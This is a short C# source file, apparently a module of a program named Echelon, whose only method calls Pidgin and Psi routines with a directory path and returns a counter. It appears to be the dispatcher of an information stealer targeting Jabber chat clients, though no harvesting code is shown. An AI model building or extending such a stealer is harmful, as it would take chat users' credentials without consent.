

namespace Echelon
{
    internal class Startjabbers
    {
        public static int count = 0;

        public static int Start(string Echelon_Dir)
        {
            Pidgin.Start(Echelon_Dir); 
            Psi.Start(Echelon_Dir); 
        
            return count;
        }
    }
}
